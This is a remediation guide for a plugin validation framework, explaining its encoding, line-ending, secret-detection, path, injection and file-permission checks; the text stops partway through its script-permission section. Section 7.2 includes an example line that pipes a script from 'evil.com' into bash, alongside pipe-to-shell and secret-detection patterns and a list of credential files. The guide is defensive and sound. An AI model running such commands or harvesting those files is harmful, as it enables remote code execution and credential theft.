# Code Quality -- Validation Issues and Fixes

Comprehensive remediation guide for encoding, security, and code quality issues detected by the CPV (Claude Plugins Validation) framework.

## Severity Levels

| Level | Blocking? | Score Impact | Description |
|---|---|---|---|
| CRITICAL | Always blocks | -25 per issue | Must fix before plugin can be used |
| MAJOR | Always blocks | -10 per issue | Should fix; indicates significant problems |
| MINOR | Always blocks | -3 per issue | Recommended to fix; quality/portability concerns |
| NIT | Blocks in `--strict` only | -1 per issue | Style and best-practice nitpicks |
| WARNING | Never blocks | None | Security advisories, always reported |
| INFO | Never blocks | None | Informational, shown in verbose mode only |

Exit codes: `0` = OK, `1` = CRITICAL, `2` = MAJOR, `3` = MINOR, `4` = NIT (strict mode only).

---

## Table of Contents

- [1. Encoding Issues](#1-encoding-issues)
  - [1.1 Non-UTF-8 Encoding](#11-non-utf-8-encoding)
  - [1.2 JSON Unicode Error](#12-json-unicode-error)
  - [1.3 Raw Control Characters](#13-raw-control-characters)
- [2. Line Ending Issues](#2-line-ending-issues)
  - [2.1 Shell Script CRLF](#21-shell-script-crlf)
  - [2.2 Shell Script CR-Only](#22-shell-script-cr-only)
  - [2.3 Shell Script Mixed Endings](#23-shell-script-mixed-endings)
  - [2.4 Source File CRLF](#24-source-file-crlf)
  - [2.5 Source File CR-Only](#25-source-file-cr-only)
  - [2.6 Source File Mixed Endings](#26-source-file-mixed-endings)
  - [2.7 Batch Script CR-Only](#27-batch-script-cr-only)
- [3. BOM Issues](#3-bom-issues)
  - [3.1 UTF-8 BOM](#31-utf-8-bom)
  - [3.2 UTF-16 LE BOM](#32-utf-16-le-bom)
  - [3.3 UTF-16 BE BOM](#33-utf-16-be-bom)
  - [3.4 UTF-32 LE BOM](#34-utf-32-le-bom)
  - [3.5 UTF-32 BE BOM](#35-utf-32-be-bom)
- [4. Secret Detection Issues](#4-secret-detection-issues)
  - [4.1 Complete SECRET_PATTERNS Reference](#41-complete-secret_patterns-reference)
  - [4.2 Fix Procedure](#42-fix-procedure)
- [5. Private Path Issues](#5-private-path-issues)
  - [5.1 Private Username in Path (CRITICAL)](#51-private-username-in-path-critical)
  - [5.2 Generic Home Directory Path (MAJOR)](#52-generic-home-directory-path-major)
  - [5.3 Hardcoded User Path (MAJOR)](#53-hardcoded-user-path-major)
- [6. Absolute Path Issues](#6-absolute-path-issues)
  - [6.1 Home Directory Absolute Path (MAJOR)](#61-home-directory-absolute-path-major)
  - [6.2 Windows Home Path (MAJOR)](#62-windows-home-path-major)
  - [6.3 System Absolute Path (MINOR in scripts, MAJOR in docs)](#63-system-absolute-path-minor-in-scripts-major-in-docs)
  - [6.4 ABSOLUTE_PATH_PATTERNS and ALLOWED_DOC_PATH_PREFIXES Reference](#64-absolute_path_patterns-and-allowed_doc_path_prefixes-reference)
- [7. Injection Detection Issues](#7-injection-detection-issues)
  - [7.1 Command Substitution (CRITICAL)](#71-command-substitution-critical)
  - [7.2 Pipe to Shell (CRITICAL)](#72-pipe-to-shell-critical)
  - [7.3 Eval Patterns (CRITICAL)](#73-eval-patterns-critical)
  - [7.4 Unsafe Variable Expansion (MAJOR)](#74-unsafe-variable-expansion-major)
- [8. Path Traversal Issues](#8-path-traversal-issues)
  - [8.1 Directory Traversal (CRITICAL)](#81-directory-traversal-critical)
  - [8.2 Absolute Unix System Path (CRITICAL)](#82-absolute-unix-system-path-critical)
  - [8.3 Windows Absolute Path (CRITICAL)](#83-windows-absolute-path-critical)
- [9. Dangerous File Issues](#9-dangerous-file-issues)
  - [9.1 Complete DANGEROUS_FILES Reference](#91-complete-dangerous_files-reference)
  - [9.2 Fix Procedure](#92-fix-procedure)
- [10. Script Permission Issues](#10-script-permission-issues)
  - [10.1 Shell Script Not Executable (MINOR)](#101-shell-script-not-executable-minor)
  - [10.2 Script is World-Writable (CRITICAL)](#102-script-is-world-writable-critical)
  - [10.3 Shell Script Missing Shebang (MINOR)](#103-shell-script-missing-shebang-minor)
  - [10.4 Non-Standard Shebang (INFO)](#104-non-standard-shebang-info)
  - [10.5 Python Script World-Writable (CRITICAL)](#105-python-script-world-writable-critical)
  - [10.6 Cannot Check Script Permissions (MAJOR)](#106-cannot-check-script-permissions-major)
- [11. Plugin Path Validation Issues](#11-plugin-path-validation-issues)
  - [11.1 Plugin Path Does Not Exist (CRITICAL)](#111-plugin-path-does-not-exist-critical)
  - [11.2 Plugin Path Is Not a Directory (CRITICAL)](#112-plugin-path-is-not-a-directory-critical)
- [12. File Access Issues](#12-file-access-issues)
  - [12.1 Cannot Read File (MINOR)](#121-cannot-read-file-minor)

---

## 1. Encoding Issues

### 1.1 Non-UTF-8 Encoding

**Error message:** `File is not valid UTF-8: <path> (error at byte <N>: <reason>)`

**Severity:** CRITICAL

**Root cause:** The file contains byte sequences that are not valid UTF-8. This typically happens when a file was saved in a legacy encoding such as Latin-1 (ISO-8859-1), Windows-1252, Shift_JIS, or GB2312.

**Fix steps:**
1. Identify the current encoding:
   ```bash
   file -I <path>
   ```
2. Convert to UTF-8:
   ```bash
   iconv -f <detected-encoding> -t UTF-8 <path> > <path>.tmp && mv <path>.tmp <path>
   ```
3. In your editor, set the file encoding to UTF-8 and re-save.
4. Verify:
   ```bash
   python3 -c "open('<path>', 'r', encoding='utf-8').read()"
   ```

**Required extensions for UTF-8:** `.py`, `.sh`, `.bash`, `.zsh`, `.md`, `.json`, `.yaml`, `.yml`, `.toml`, `.txt`, `.js`, `.ts`, `.tsx`, `.jsx`, `.html`, `.htm`, `.css`, `.xml`, `.ini`, `.cfg`, `.conf`, `.env.example`, `.gitignore`, `.gitattributes`, `.editorconfig`, `.prettierrc`, `.eslintrc`

---

### 1.2 JSON Unicode Error

**Error message:** `JSON Unicode error in <path>: <details>`

**Severity:** MAJOR

**Root cause:** The JSON file contains improperly encoded Unicode characters or invalid Unicode escape sequences that cause `json.loads()` to fail with a Unicode-related error.

**Fix steps:**
1. Try loading the file in Python to see the exact error:
   ```python
   import json
   json.loads(open("<path>").read())
   ```
2. Fix invalid Unicode escape sequences (e.g., `\uD800`-`\uDFFF` surrogate pairs used outside of proper surrogate pair context).
3. Replace any raw non-UTF-8 bytes with proper Unicode characters.
4. Validate: `python3 -m json.tool <path> > /dev/null`

---

### 1.3 Raw Control Characters

**Error message:** `File contains raw control characters (<char_codes>): <path>`

**Severity:** MINOR

**Root cause:** The file contains raw ASCII control characters (codes 0x00-0x08, 0x0B, 0x0C, 0x0E-0x1F, 0x7F) that are not standard newlines (`\n`, 0x0A), carriage returns (`\r`, 0x0D), or tabs (`\t`, 0x09). These can cause rendering issues and may indicate file corruption.

**Fix steps:**
1. Find control characters:
   ```bash
   grep -P '[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]' <path>
   ```
2. Remove or replace them:
   ```bash
   sed -i '' 's/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]//g' <path>
   ```
3. Or in Python:
   ```python
   import re
   text = open("<path>").read()
   clean = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text)
   open("<path>", "w").write(clean)
   ```

---

## 2. Line Ending Issues

### 2.1 Shell Script CRLF

**Error message:** `Shell script has CRLF line endings (will break execution): <path>`

**Severity:** CRITICAL

**Root cause:** Shell scripts (`.sh`, `.bash`, `.zsh`, `.ksh`) contain Windows-style `\r\n` line endings. This causes `bad interpreter` or `\r: command not found` errors because the shell interprets `\r` as part of the command.

**Fix steps:**
1. Convert to LF:
   ```bash
   sed -i '' 's/\r$//' <path>
   # or
   dos2unix <path>
   ```
2. Configure `.gitattributes` to prevent this:
   ```
   *.sh text eol=lf
   *.bash text eol=lf
   *.zsh text eol=lf
   ```
3. Configure your editor to use LF for shell scripts.

---

### 2.2 Shell Script CR-Only

**Error message:** `Shell script has CR-only line endings (will break execution): <path>`

**Severity:** CRITICAL

**Root cause:** Shell scripts use old Mac-style `\r`-only line endings (pre-macOS). This is extremely rare on modern systems and completely breaks shell execution.

**Fix steps:**
1. Convert CR to LF:
   ```bash
   tr '\r' '\n' < <path> > <path>.tmp && mv <path>.tmp <path>
   ```
2. Or use `mac2unix`:
   ```bash
   mac2unix <path>
   ```

---

### 2.3 Shell Script Mixed Endings

**Error message:** `Shell script has mixed line endings: <path>`

**Severity:** MAJOR

**Root cause:** The shell script contains a mix of CRLF and LF line endings, indicating it was edited on different platforms without normalization.

**Fix steps:**
1. Normalize all line endings to LF:
   ```bash
   sed -i '' 's/\r$//' <path>
   ```
2. Add `.gitattributes` rule:
   ```
   *.sh text eol=lf
   ```

---

### 2.4 Source File CRLF

**Error message:** `Source file has CRLF line endings (should use LF): <path>`

**Severity:** MINOR

**Root cause:** A source file (`.py`, `.md`, `.json`, `.yaml`, `.yml`, `.toml`, `.js`, `.ts`, `.tsx`, `.jsx`, `.html`, `.htm`, `.css`, `.xml`) uses CRLF line endings instead of the expected LF. While functional, this creates unnecessary diffs and cross-platform inconsistency.

**Fix steps:**
1. Convert to LF:
   ```bash
   sed -i '' 's/\r$//' <path>
   ```
2. Add `.gitattributes`:
   ```
   *.py text eol=lf
   *.json text eol=lf
   *.md text eol=lf
   ```

---

### 2.5 Source File CR-Only

**Error message:** `Source file has old Mac-style CR line endings: <path>`

**Severity:** MINOR

**Root cause:** Source file uses legacy Mac CR-only line endings.

**Fix steps:**
Same as [2.2 Shell Script CR-Only](#22-shell-script-cr-only) -- convert CR to LF.

---

### 2.6 Source File Mixed Endings

**Error message:** `Source file has mixed line endings: <path>`

**Severity:** MINOR

**Root cause:** Source file has inconsistent line endings (mix of CRLF and LF).

**Fix steps:**
Same as [2.3 Shell Script Mixed Endings](#23-shell-script-mixed-endings) -- normalize to LF.

---

### 2.7 Batch Script CR-Only

**Error message:** `Batch script has old Mac-style CR line endings: <path>`

**Severity:** MINOR

**Root cause:** A batch script (`.bat`, `.cmd`, `.ps1`) uses CR-only line endings. Note: CRLF is acceptable and expected for batch scripts.

**Fix steps:**
Convert CR to CRLF (the correct format for batch files):
```bash
tr '\r' '\n' < <path> | sed 's/$'"/$(printf '\r')/" > <path>.tmp && mv <path>.tmp <path>
```
Or simply re-save the file in a Windows-aware editor with CRLF endings.

---

## 3. BOM Issues

### 3.1 UTF-8 BOM

**Error message:** `File has UTF-8 BOM (should be UTF-8 without BOM): <path>`

**Severity:** MAJOR

**Root cause:** The file starts with the byte sequence `EF BB BF` (UTF-8 Byte Order Mark). While technically valid UTF-8, the BOM is unnecessary for UTF-8 and causes issues with many tools (e.g., shell scripts fail, JSON parsers may reject it, diff tools show artifacts).

**Fix steps:**
1. Remove the BOM:
   ```bash
   sed -i '' '1s/^\xEF\xBB\xBF//' <path>
   ```
2. Or in Python:
   ```python
   content = open("<path>", "rb").read()
   if content.startswith(b"\xef\xbb\xbf"):
       open("<path>", "wb").write(content[3:])
   ```
3. Configure your editor to save UTF-8 *without* BOM.

---

### 3.2 UTF-16 LE BOM

**Error message:** `File has UTF-16 LE BOM (must use UTF-8): <path>`

**Severity:** CRITICAL

**Root cause:** The file starts with `FF FE`, indicating UTF-16 Little Endian encoding. All plugin files must be UTF-8.

**Fix steps:**
1. Convert to UTF-8:
   ```bash
   iconv -f UTF-16LE -t UTF-8 <path> > <path>.tmp && mv <path>.tmp <path>
   ```
2. Remove any residual BOM after conversion.

---

### 3.3 UTF-16 BE BOM

**Error message:** `File has UTF-16 BE BOM (must use UTF-8): <path>`

**Severity:** CRITICAL

**Root cause:** The file starts with `FE FF`, indicating UTF-16 Big Endian encoding.

**Fix steps:**
```bash
iconv -f UTF-16BE -t UTF-8 <path> > <path>.tmp && mv <path>.tmp <path>
```

---

### 3.4 UTF-32 LE BOM

**Error message:** `File has UTF-32 LE BOM (must use UTF-8): <path>`

**Severity:** CRITICAL

**Root cause:** The file starts with `FF FE 00 00`, indicating UTF-32 Little Endian encoding.

**Fix steps:**
```bash
iconv -f UTF-32LE -t UTF-8 <path> > <path>.tmp && mv <path>.tmp <path>
```

---

### 3.5 UTF-32 BE BOM

**Error message:** `File has UTF-32 BE BOM (must use UTF-8): <path>`

**Severity:** CRITICAL

**Root cause:** The file starts with `00 00 FE FF`, indicating UTF-32 Big Endian encoding.

**Fix steps:**
```bash
iconv -f UTF-32BE -t UTF-8 <path> > <path>.tmp && mv <path>.tmp <path>
```

---

## 4. Secret Detection Issues

**Error message:** `<secret_type> detected: <masked_line>`

**Severity:** CRITICAL

**Root cause:** A line in the file matches one of the secret detection patterns. The actual secret content is masked in the report (truncated to 40 characters).

### 4.1 Complete SECRET_PATTERNS Reference

| # | Pattern (regex) | Secret Type |
|---|---|---|
| 1 | `AKIA[0-9A-Z]{16}` | AWS Access Key |
| 2 | `-----BEGIN (RSA\|DSA\|EC\|OPENSSH )?PRIVATE KEY-----` | Private Key |
| 3 | `ghp_[a-zA-Z0-9]{36}` | GitHub Personal Access Token |
| 4 | `sk-[a-zA-Z0-9]{20,}` | API Key (sk-... format) |
| 5 | `xox[baprs]-[0-9a-zA-Z-]+` | Slack Token |
| 6 | `github_pat_[a-zA-Z0-9_]{22,}` | GitHub Fine-Grained Personal Access Token |
| 7 | `AIza[0-9A-Za-z\-_]{35}` | Google API Key |
| 8 | `sk_live_[a-zA-Z0-9]{24,}` | Stripe Secret Key |
| 9 | `pk_live_[a-zA-Z0-9]{24,}` | Stripe Publishable Key |
| 10 | `sk-ant-[a-zA-Z0-9\-_]{80,}` | Anthropic API Key |
| 11 | `npm_[a-zA-Z0-9]{36}` | npm Access Token |
| 12 | `://[^:\s]+:[^@\s]+@[^\s]+` | Database Connection String with Credentials |
| 13 | `SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}` | SendGrid API Key |
| 14 | `api[_-]?key['\"]?\s*[:=]\s*['\"](?!\$[\{A-Z_])[^'\"]{20,}['\"]` (case-insensitive) | Generic API Key |
| 15 | `eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}` | JWT Token |
| 16 | `aws_secret_access_key\s*[:=]\s*['\"]?[A-Za-z0-9/+=]{40}` (case-insensitive) | AWS Secret Access Key |

### 4.2 Fix Procedure

1. **Identify the secret:** Check the file and line number reported.
2. **Revoke the secret immediately:** If this is a real secret that was committed, consider it compromised. Rotate it at the provider (AWS console, GitHub settings, Stripe dashboard, etc.).
3. **Remove from code:** Replace the hardcoded secret with an environment variable reference:
   ```python
   # WRONG:
   api_key = "sk-abc123..."

   # RIGHT:
   import os
   api_key = os.environ["MY_API_KEY"]
   ```
4. **Add to `.env.example`** (without the actual value):
   ```
   MY_API_KEY=your-key-here
   ```
5. **Scrub git history** if the secret was previously committed:
   ```bash
   git filter-branch --force --index-filter \
     'git rm --cached --ignore-unmatch <path>' \
     --prune-empty --tag-name-filter cat -- --all
   ```
   Or use `git-filter-repo` or BFG Repo-Cleaner.
6. **For JWT tokens in test fixtures:** If these are intentionally expired/fake tokens for tests, consider restructuring test data to avoid triggering the pattern, or document the exception.

**Note on the Generic API Key pattern:** The pattern excludes environment variable placeholders like `${VAR}` or `$VAR`. If you use `api_key = "${MY_KEY}"`, it will NOT trigger a false positive.

---

## 5. Private Path Issues

### 5.1 Private Username in Path (CRITICAL)

**Error message:** `Private info leaked: <OS> private path with username '<username>' - found '<matched_text>' (replace with relative path or ${CLAUDE_PLUGIN_ROOT})`

**Severity:** CRITICAL

**Root cause:** The file contains an absolute path that includes the current system user's actual username (auto-detected from `getpass.getuser()`, `Path.home()`, or environment variables `USER`, `USERNAME`, `LOGNAME`). This leaks personal information and makes the plugin non-portable.

Detected OS patterns:
- macOS: home directory paths like `~/<your-username>/...`
- Linux: home directory paths like `~/<your-username>/...`
- Windows: `%USERPROFILE%\...` or paths starting with a drive letter + `\Users\`
- Username appearing between path separators in any path context

**Fix steps:**
1. Replace with relative path:
   ```python
   # WRONG:
   config_path = "/Users/johndoe/projects/my-plugin/config.json"

   # RIGHT:
   config_path = "${CLAUDE_PLUGIN_ROOT}/config.json"
   # or
   config_path = "./config.json"
   ```
2. If you need the home directory at runtime, use environment variables:
   ```python
   import os
   home = os.path.expanduser("~")
   # or
   home = os.environ.get("HOME", os.path.expanduser("~"))
   ```
3. For plugin paths, always use `${CLAUDE_PLUGIN_ROOT}` or `${CLAUDE_PROJECT_DIR}`.

---

### 5.2 Generic Home Directory Path (MAJOR)

**Error message:** `Hardcoded user path found: '<matched_text>...' (use relative paths or ${CLAUDE_PLUGIN_ROOT})`

**Severity:** MAJOR

**Root cause:** The file contains a path matching `/Users/<name>/`, `/home/<name>/`, or `C:\Users\<name>\` where `<name>` is NOT a recognized example username. The validator first checks for the current system user (CRITICAL), and if no match, falls back to this generic check (MAJOR).

**Excluded example usernames (these do NOT trigger the error):** `username`, `user`, `dev`, `developer`, `runner`, `admin`, `root`, `yourname`, `your-name`, `your_name`, `yourusername`, `your-username`, `example`, `test`, `demo`, `sample`, `foo`, `bar`, `john`, `jane`, `me`, `you`, `name`, `xxx`, `myuser`, `myname`, `your`, `my`

**Fix steps:**
Same as [5.1](#51-private-username-in-path-critical) -- replace with relative paths or environment variable references.

---

### 5.3 Hardcoded User Path (MAJOR)

**Error message:** `Hardcoded user path detected (use ${CLAUDE_PLUGIN_ROOT} instead): <matched_text>`

**Severity:** MAJOR

**Root cause:** The `scan_for_user_paths()` function in `validate_security.py` detected a path matching the USER_PATH_PATTERNS:
- `/Users/<anything>/`
- `C:\Users\<anything>\`
- `/home/<anything>/`

This check is skipped for: validator scripts, markdown documentation (`.md`, `.mdx`, `.markdown`), and test files.

**Fix steps:**
Same as [5.1](#51-private-username-in-path-critical).

---

## 6. Absolute Path Issues

### 6.1 Home Directory Absolute Path (MAJOR)

**Error message:** `Absolute path found: '<matched_text>...' - use relative path, ${CLAUDE_PLUGIN_ROOT}, or ${CLAUDE_PROJECT_DIR}`

**Severity:** MAJOR

**Root cause:** The file contains an absolute path starting with `/Users/` or `/home/` followed by a username that is not in the EXAMPLE_USERNAMES set. The pattern uses a lookbehind to skip shebang lines (`#!`).

**Fix steps:**
1. Replace with `${CLAUDE_PLUGIN_ROOT}` for plugin-relative paths.
2. Replace with `${CLAUDE_PROJECT_DIR}` for project-relative paths.
3. Replace with `${HOME}` or `~` for user home directory references.
4. Use relative paths (`./`, `../`) where possible.

---

### 6.2 Windows Home Path (MAJOR)

**Error message:** `Absolute path found: '<matched_text>...' - use relative path, ${CLAUDE_PLUGIN_ROOT}, or ${CLAUDE_PROJECT_DIR}`

**Severity:** MAJOR

**Root cause:** The file contains a Windows-style absolute path like `C:\Users\...` or `C:/Users/...`.

**Fix steps:**
Same as [6.1](#61-home-directory-absolute-path-major).

---

### 6.3 System Absolute Path (MINOR in scripts, MAJOR in docs)

**Error message:** `Absolute path found: '<matched_text>...' - use relative path, ${CLAUDE_PLUGIN_ROOT}, or ${CLAUDE_PROJECT_DIR}`

**Severity:** MINOR (in non-doc code files) or MAJOR (in documentation files)

**Root cause:** The file contains a Unix system absolute path like `/usr/...`, `/opt/...`, `/etc/...`, `/var/...`, `/bin/...`, `/sbin/...`, `/lib/...`, `/root/...`. In scripts this may be intentional (MINOR); in documentation it signals non-portable examples.

The lookbehind `(?<![#!])` skips shebangs. Paths using `${CLAUDE_PLUGIN_ROOT}` or `${CLAUDE_PROJECT_DIR}` prefixes are also excluded.

**Fix steps:**
1. For runtime system tool references, use `which` or `command -v` to locate them:
   ```bash
   # WRONG:
   /usr/bin/python3 script.py

   # RIGHT:
   python3 script.py
   ```
2. For configuration paths, use environment variables:
   ```bash
   # WRONG:
   config="/etc/myapp/config.yaml"

   # RIGHT:
   config="${CLAUDE_PLUGIN_ROOT}/config.yaml"
   ```

### 6.4 ABSOLUTE_PATH_PATTERNS and ALLOWED_DOC_PATH_PREFIXES Reference

**ABSOLUTE_PATH_PATTERNS** (from `cpv_validation_common.py`):

| # | Description | Pattern |
|---|---|---|
| 1 | Home directory path | `(?<![#!])(/(?:Users\|home)/[^/\s"'` `` >\]})+/[^\s"'`` >\]})+)` |
| 2 | Windows home path | `([A-Z]:[\\\/]Users[\\\/][^\s"'` `` >\]})+)` (case-insensitive) |
| 3 | System absolute path | `(?<![#!])(?<!\$\{CLAUDE_PLUGIN_ROOT\})(?<!\$\{CLAUDE_PROJECT_DIR\})(?<![\w$\{])(/(?:usr\|opt\|etc\|var\|bin\|sbin\|lib\|root)/[^\s"'` `` >\]})+)` |

**ALLOWED_DOC_PATH_PREFIXES** (skipped in documentation files `.md`, `.txt`, `.html`, `.rst`, `.adoc`):

| Prefix | Common usage |
|---|---|
| `/tmp/` | Temporary file examples |
| `/var/tmp/` | Temporary file examples |
| `/dev/` | Device references (e.g., `/dev/null`) |
| `/proc/` | Linux proc filesystem examples |
| `/sys/` | Linux sysfs examples |
| `/etc/` | Config file examples |
| `/usr/bin/` | Shebang and tool path examples |
| `/usr/local/` | Installation path examples |
| `/opt/` | Deployment path examples |

---

## 7. Injection Detection Issues

**Note:** All injection checks are **skipped** for validator scripts (`validate_*.py`, `cpv_validation_common.py`). Command substitution checks are additionally skipped for shell scripts, markdown files, and test files.

### 7.1 Command Substitution (CRITICAL)

**Error messages:**
- `Command substitution $(...) detected: <truncated_line>`
- `` Command substitution `...` detected: <truncated_line> ``

**Severity:** CRITICAL

**Root cause:** The file contains `$(...)` or `` `...` `` command substitution syntax in a non-shell, non-markdown, non-test file. This could allow arbitrary command execution if the content is processed by a shell.

**Patterns detected:**
- `\$\([^)]+\)` -- POSIX command substitution `$(command)`
- `` `[^`]+` `` -- Legacy backtick command substitution

**Fix steps:**
1. If this is a shell script, rename it with a `.sh` extension so the validator knows command substitution is expected.
2. If this is in a non-shell file and is not needed, remove the command substitution.
3. If the command substitution is in a string constant or documentation, consider moving it to a markdown file or test file.
4. If legitimate, consider restructuring to avoid shell command substitution (e.g., use Python's `subprocess` instead).

---

### 7.2 Pipe to Shell (CRITICAL)

**Error messages:**
- `Pipe to sh detected: <truncated_line>`
- `Pipe to bash detected: <truncated_line>`
- `Pipe to zsh detected: <truncated_line>`
- `Pipe to ksh detected: <truncated_line>`
- `Pipe to source detected: <truncated_line>`
- `Pipe to dot (source) detected: <truncated_line>`

**Severity:** CRITICAL

**Root cause:** The file contains a pipe to a shell interpreter (`| sh`, `| bash`, `| zsh`, `| ksh`, `| source`, `| . `). This is extremely dangerous as it enables arbitrary code execution from piped input (e.g., `curl https://evil.com/script.sh | bash`).

**Patterns detected:**
- `\|\s*sh\b`
- `\|\s*bash\b`
- `\|\s*zsh\b`
- `\|\s*ksh\b`
- `\|\s*source\b`
- `\|\s*\.\s` (dot-source)

**Note:** Lines that look like markdown tables (contain `|` at least twice and include "object" or "string") are skipped.

**Fix steps:**
1. Download the script to a file first, inspect it, then execute:
   ```bash
   # WRONG:
   curl https://example.com/install.sh | bash

   # RIGHT:
   curl -o install.sh https://example.com/install.sh
   # Review install.sh
   bash install.sh
   ```
2. If this is in documentation, add a note about the security implications.

---

### 7.3 Eval Patterns (CRITICAL)

**Error messages:**
- `eval command detected: <truncated_line>`
- `exec command detected: <truncated_line>`
- `Python eval() detected: <truncated_line>`
- `Python exec() detected: <truncated_line>`
- `Python compile() with exec mode: <truncated_line>`
- `JavaScript Function constructor (eval-like): <truncated_line>`
- `JavaScript new Function() (eval-like): <truncated_line>`

**Severity:** CRITICAL

**Root cause:** The file contains eval/exec patterns that allow arbitrary code execution.

**Patterns detected:**
- Shell: `\beval\s+`, `\bexec\s+`
- Python: `\beval\s*\(`, `\bexec\s*\(`, `\bcompile\s*\([^)]*\bexec\b`
- JavaScript: `\bFunction\s*\(`, `\bnew\s+Function\s*\(`

**Fix steps:**
1. Replace `eval()` with safer alternatives:
   ```python
   # WRONG:
   result = eval(user_input)

   # RIGHT (for math):
   import ast
   result = ast.literal_eval(user_input)

   # RIGHT (for JSON):
   import json
   result = json.loads(user_input)
   ```
2. Replace `exec()` with explicit function calls or module imports.
3. Replace `new Function()` in JavaScript with direct function definitions.
4. If eval/exec is truly necessary (e.g., plugin system, template engine), ensure inputs are strictly validated and sandboxed.

---

### 7.4 Unsafe Variable Expansion (MAJOR)

**Error messages:**
- `Unquoted variable expansion may be unsafe: <truncated_line>`
- `Unquoted variable in comparison: <truncated_line>`

**Severity:** MAJOR

**Root cause:** Shell variables are used without proper quoting, which can lead to word splitting, globbing, or injection attacks.

**Patterns detected:**
- `(?:^|[|;&])\s*\$[A-Za-z_][A-Za-z0-9_]*(?:\s|$|[|;&])` -- Unquoted variable at start of command or after pipe/semicolon
- `\[\[\s*\$[A-Za-z_][A-Za-z0-9_]*\s*(?:==|!=|<|>|-eq|-ne|-lt|-gt)` -- Unquoted variable in `[[ ]]` comparison

**Fix steps:**
1. Always quote variable expansions:
   ```bash
   # WRONG:
   echo $USER_INPUT

   # RIGHT:
   echo "$USER_INPUT"
   ```
2. In comparisons:
   ```bash
   # WRONG:
   [[ $value == expected ]]

   # RIGHT:
   [[ "$value" == "expected" ]]
   ```

---

## 8. Path Traversal Issues

**Note:** Path traversal checks are **skipped** for: validator scripts, markdown documentation (`.md`, `.mdx`, `.markdown`), test files, comment lines, and shebang lines.

### 8.1 Directory Traversal (CRITICAL)

**Error messages:**
- `Path traversal ../ detected: <truncated_line>`
- `Path traversal ..\\ detected: <truncated_line>`

**Severity:** CRITICAL

**Root cause:** The file contains `../` or `..\` path traversal sequences that could be used to escape the plugin directory and access unauthorized files.

**Patterns detected:**
- `\.\./`
- `\.\.\\`

**Fix steps:**
1. Use absolute paths with `${CLAUDE_PLUGIN_ROOT}` instead of relative traversal:
   ```python
   # WRONG:
   config = open("../../etc/config.json")

   # RIGHT:
   config = open("${CLAUDE_PLUGIN_ROOT}/config.json")
   ```
2. If relative paths are needed, keep them within the plugin directory (e.g., `./subdir/file`).
3. Validate and canonicalize paths at runtime:
   ```python
   import os
   resolved = os.path.realpath(user_path)
   if not resolved.startswith(plugin_root):
       raise SecurityError("Path traversal detected")
   ```

---

### 8.2 Absolute Unix System Path (CRITICAL)

**Error message:** `Absolute Unix system path detected: <truncated_line>`

**Severity:** CRITICAL

**Root cause:** The file contains an absolute reference to a Unix system directory (`/usr/`, `/etc/`, `/var/`, `/tmp/`, `/opt/`, `/bin/`, `/sbin/`, `/lib/`, `/root/`) that is not preceded by `${CLAUDE_PLUGIN_ROOT}` or `${CLAUDE_PROJECT_DIR}`.

**Pattern:** `(?<!\$\{CLAUDE_PLUGIN_ROOT\})(?<!\$\{CLAUDE_PROJECT_DIR\})(?<![\w$\{])/(?:usr|etc|var|tmp|opt|bin|sbin|lib|root)/`

**Note:** This is the pattern in `validate_security.py`'s PATH_TRAVERSAL_PATTERNS, which is separate from the ABSOLUTE_PATH_PATTERNS in `cpv_validation_common.py`.

**Fix steps:**
Same as [6.3](#63-system-absolute-path-minor-in-scripts-major-in-docs).

---

### 8.3 Windows Absolute Path (CRITICAL)

**Error message:** `Windows absolute path detected: <truncated_line>`

**Severity:** CRITICAL

**Root cause:** The file contains a Windows drive letter path like `C:\...` or `D:\...`.

**Pattern:** `[A-Za-z]:\\`

**Fix steps:**
Use platform-independent path handling:
```python
# WRONG:
path = "C:\\Users\\me\\project"

# RIGHT:
import os
path = os.path.join(os.environ.get("CLAUDE_PLUGIN_ROOT", "."), "project")
```

---

## 9. Dangerous File Issues

**Error message:** `Dangerous file detected: <relative_path>`

**Severity:** CRITICAL

**Root cause:** A file with a known-dangerous filename was found in the plugin directory tree. These files typically contain secrets, credentials, or sensitive configuration that should never be distributed with a plugin.

### 9.1 Complete DANGEROUS_FILES Reference

| Category | Filenames |
|---|---|
| **Environment files** | `.env`, `.env.local`, `.env.development`, `.env.production`, `.env.staging`, `.env.test` |
| **Credential files** | `credentials.json`, `secrets.json`, `config.secret.json`, `auth.json`, `token.json` |
| **SSH keys** | `id_rsa`, `id_ed25519`, `id_dsa`, `id_ecdsa`, `private.key` |
| **Package registry auth** | `.npmrc`, `.pypirc`, `.netrc` |
| **Cloud/infra credentials** | `service-account.json`, `service_account_key.json`, `kubeconfig`, `.docker/config.json` |
| **Web server auth** | `.htpasswd` |
| **TLS certificates/keys** | `cert.pem`, `key.pem`, `server.pem`, `client.pem`, `ca.pem` |

### 9.2 Fix Procedure

1. **Remove the file** from the plugin directory.
2. **Add to `.gitignore`:**
   ```gitignore
   .env
   .env.*
   credentials.json
   secrets.json
   *.pem
   id_rsa
   id_ed25519
   id_dsa
   id_ecdsa
   .npmrc
   .pypirc
   .netrc
   ```
3. **Scrub from git history** if it was previously committed (same process as [4.2 Fix Procedure](#42-fix-procedure) step 5).
4. **Provide a template** instead:
   - `.env` -> `.env.example` (with placeholder values)
   - `credentials.json` -> `credentials.example.json`
5. **Document** in README which secrets/files users need to provide.

---

## 10. Script Permission Issues

### 10.1 Shell Script Not Executable (MINOR)

**Error message:** `Shell script is not executable: <path>`

**Severity:** MINOR

**Root cause:** A `.sh` file does not have the executable bit (`u+x`) set. While the script can still be run with `bash <path>`, the convention for shell scripts is to be directly executable.

**Fix steps:**
```bash
chmod +x <path>
```
And add a `.gitattributes` entry if needed:
```
*.sh diff=bash
```

---

### 10.2 Script is World-Writable (CRITICAL)

**Error message:** `Script is world-writable: <path>`

**Severity:** CRITICAL

**Root cause:** A shell script (`.sh`) has the world-writable permission bit set (`o+w`, visible as `-rwxrwxrwx` or similar in `ls -la`). This is a security risk because any user on the system could modify the script to inject malicious code.

**Fix steps:**
```bash
chmod o-w <path>
# Typical safe permissions:
chmod 755 <path>   # rwxr-xr-x (executable)
chmod 644 <path>   # rw-r--r-- (non-executable)
```

---

### 10.3 Shell Script Missing Shebang (MINOR)

**Error message:** `Shell script missing shebang: <path>`

**Severity:** MINOR

**Root cause:** A `.sh` file does not start with a `#!` (shebang) line. Without a shebang, the system may use the wrong interpreter or fail to execute the script directly.

**Fix steps:**
